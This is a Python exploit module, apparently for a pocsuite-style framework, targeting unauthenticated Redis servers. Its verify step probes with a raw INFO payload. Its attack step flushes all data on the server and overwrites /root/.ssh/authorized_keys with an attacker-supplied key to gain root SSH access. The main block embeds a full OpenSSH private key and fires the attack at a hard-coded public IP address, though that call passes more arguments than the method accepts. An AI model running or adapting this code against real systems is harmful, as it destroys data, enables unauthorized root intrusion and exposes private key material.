#!/usr/bin/env python3
# -*- coding:utf-8 -*-
import socket
import redis
import sys
from newpoc.api import PocBase, Output
from newpoc.cli import POC_QUEUE


# result = {
#     # 不管是验证模式或者攻击模式，返回结果 result 中的 key 值必须按照下面的规范来写
#     # [ PoC结果返回规范 ]( https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md#resultstandard )
#     "Result": {
#         "DBInfo": {
#             "Username": "xxx",
#             "Password": "xxx",
#             "Salt": "xxx",
#             "Uid": "xxx",
#             "Groupid": "xxx",
#         },
#         "ShellInfo": {"URL": "xxx", "Content": "xxx"},
#         "FileInfo": {"Filename": "xxx", "Content": "xxx"},
#         "XSSInfo": {"URL": "xxx", "Payload": "xxx"},
#         "AdminInfo": {"Uid": "xxx", "Username": "xxx", "Password": "xxx"},
#         "Database": {
#             "Hostname": "xxx",
#             "Username": "xxx",
#             "Password": "xxx",
#             "DBname": "xxx",
#         },
#         "VerifyInfo": {"URL": "xxx", "Postdata": "xxx", "Path": "xxx"},
#         "SiteAttr": {"Process": "xxx"},
#         "Stdout": "result output string",
#     }
# }


class POC(PocBase):
    cnvd_cve = 'CNVD-2015-07557'  # ssvid ID 如果是提交漏洞的同时提交 PoC，则写成 0
    version = '1'  # 默认为1
    author = 'myxae86'  # PoC 作者的大名
    vulDate = '2021-08-28'  # 漏洞公开的时间，不知道就写今天
    createDate = '2021-08-28'  # 编写 PoC 的日期
    updateDate = '2021-08-29'  # PoC 更新的时间，默认和编写时间一样
    references = []  # 漏洞地址来源，0day 不用写
    name = 'Redis未授权访问漏洞'  # PoC 名称
    appPowerLink = 'https://redis.io/'  # 漏洞厂商主页地址
    appName = 'Redis'  # 漏洞应用名称
    appVersion = '4.x/5.0.5'  # 漏洞影响版本
    vulType = 'Unauthorized Access'  # 漏洞类型，类型参考见漏洞类型规范表
    desc = '''
        Redis默认情况下会绑定在0.0.0.0:6379，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。
        攻击者在未授权访问Redis的情况下可以利用Redis的相关方法，可以成功将自己的公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys文件中，进而可以直接登录目标服务器。
        *1
        $4
        info
    '''  # 漏洞简要描述
    samples = ['192.168.1.23']  # 测试样列，就是用 PoC 测试成功的网站
    install_requires = ['redis']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = ''' 
        porkpocs -r urls.txt -t pocs/Redis/redisdone.py -v
        porkpocs -r urls.txt -t pocs/Redis/redisdone.py -a
    '''
    output = Output()

    def _verify(self, ip):
        result = {
            "target-url": '',
            "poc-name": self.name,
            "poc-id": self.cnvd_cve,
            "component": self.vulType,
            "version": self.appVersion,
            "status": 'ok'
        }
        ip = ip['url']
        result_url = ip
        ip, port = ip.split(':')
        payload = "\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        try:
            s.connect((ip, int(port)))
            s.sendall(payload.encode())
            recvdata = s.recv(1024).decode()
            if 'redis_version' in recvdata:
                self.output.success('{} is vulnerable '.format(ip))
                result['target-url'] = result_url
                POC_QUEUE.put(result)
            else:
                self.output.fail('{} is not vulnerable '.format(ip))
        except Exception as err:
            self.output.fail('{0} is fail {1}'.format(ip, err))

    def _attack(self, ip):
        try:
            sshkey = ip['payload']
            ip, port = ip['url'].split(':')
            self.output.check(sshkey.read())
            r = redis.StrictRedis(host=ip, port=port, db=0, socket_timeout=5)
            r.flushall()
            r.set('crackit', sshkey)
            r.config_set('dir', '/root/.ssh/')
            r.config_set('dbfilename', 'authorized_keys')
            r.save()
            self.output.success('[+] Write SSHkeygen successful')
        except:
            self.output.error('[-] Write SSHkeygen Failed')
            pass

    def _shell(self):
        pass

    def parse_output(self, result):
        POC_QUEUE.put(result)


if __name__ == '__main__':
    s = POC()

    cc = """-----BEGIN OPENSSH PRIVATE KEY-----
    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
    bJ/ozPHZkudwkAAAAJcm9vdEBrYWxpAQI=
    -----END OPENSSH PRIVATE KEY-----"""
    s._attack("104.130.158.64", cc)